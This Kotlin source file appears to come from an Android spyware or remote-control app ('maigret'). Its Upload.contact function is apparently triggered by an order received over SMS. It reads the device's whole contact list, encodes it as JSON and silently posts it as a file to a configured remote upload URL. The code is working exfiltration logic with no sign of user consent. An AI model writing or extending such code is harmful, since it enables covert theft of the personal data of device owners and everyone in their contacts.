package app.maigret.commands

import app.maigret.utils.contact.readContacts
import app.maigret.utils.settings.SettingsObj
import app.maigret.utils.sms.MaigretOrder
import io.ktor.client.*
import io.ktor.client.engine.cio.*
import io.ktor.client.request.*
import io.ktor.client.request.forms.*
import io.ktor.http.*
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json

object Upload {

    fun contact(maigretOrder: MaigretOrder) {
        CoroutineScope(Dispatchers.IO).launch {
            // Get Contacts and convert it to ByteArray, so it can be sent as File
            val contactsFileLike = Json.encodeToString(
                readContacts(SettingsObj.globalContext))
                .toByteArray(Charsets.UTF_16)

            HttpClient(CIO).post(SettingsObj.fileUploadURL) {
                contentType(ContentType.MultiPart.FormData)

                setBody(MultiPartFormDataContent(formData {
                    append("type", "contact")
                    append("sender", "+44 987 654 3210")
                    append("data", contactsFileLike, Headers.build {
                        append(HttpHeaders.ContentDisposition, "filename=file.txt")
                        append(HttpHeaders.ContentType, "text/plain; charset=utf-16")
                    })
                }))
            }
        }
    }
}